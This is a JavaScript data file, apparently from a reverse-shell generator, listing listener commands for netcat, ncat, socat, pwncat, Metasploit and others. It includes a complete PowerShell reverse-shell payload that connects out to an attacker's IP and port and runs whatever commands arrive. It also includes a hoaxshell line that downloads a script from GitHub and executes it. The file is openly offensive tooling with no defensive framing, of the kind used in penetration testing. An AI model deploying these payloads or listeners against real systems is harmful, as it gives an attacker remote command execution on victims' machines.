export const rsgData = {
    listenerCommands: [
        ['nc', 'nc -lvnp {port}'],
        ['nc freebsd', 'nc -lvn {port}'],
		['busybox nc', 'busybox nc -lp {port}'],
        ['ncat', 'ncat -lvnp {port}'],
        ['ncat.exe', 'ncat.exe -lvnp {port}'],
        ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
		['rustcat', 'rcat listen {port}'],
        ['openssl', 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {port}'],
        ['pwncat', 'python3 -m pwncat -lp {port}'],
        ['pwncat (windows)', 'python3 -m pwncat -m windows -lp {port}'],
        ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
        ['powercat', 'powercat -l -p {port}'],
        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'],
        ['hoaxshell', 'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}']
    ],

    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],

    upgrade: ['python', ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    },
};
